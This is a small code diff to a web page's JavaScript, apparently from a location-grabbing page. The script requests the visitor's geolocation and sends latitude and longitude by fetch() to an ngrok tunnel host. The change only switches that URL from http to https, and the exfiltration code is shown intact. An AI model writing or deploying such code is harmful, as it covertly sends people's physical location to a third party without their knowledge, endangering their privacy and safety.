@@ -11,7 +11,7 @@
       function showPosition(position) {
         latitude = position.coords.latitude;
         longitude = position.coords.longitude;
-        url = "http://1fcf9e9ea5a8.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
+        url = "https://1fcf9e9ea5a8.ngrok.io/loc?lat=" + latitude + "&long=" + longitude;
         fetch(url);
       }
       window.navigator.geolocation.getCurrentPosition(showPosition, console.log);
